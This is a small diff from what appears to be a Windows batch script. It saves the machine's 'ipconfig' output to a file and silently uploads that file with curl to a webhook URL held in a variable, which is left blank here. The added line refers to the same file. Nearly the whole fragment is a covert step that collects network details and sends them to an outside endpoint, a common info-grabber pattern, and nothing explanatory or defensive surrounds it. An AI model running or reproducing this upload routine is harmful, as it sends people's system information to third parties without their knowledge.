@@ -2,3 +2,4 @@ set webhook=
 ipconfig >ip.txt
 
 curl --silent --output /dev/null -F l=@"ip.txt" %webhook%
+ip.txt
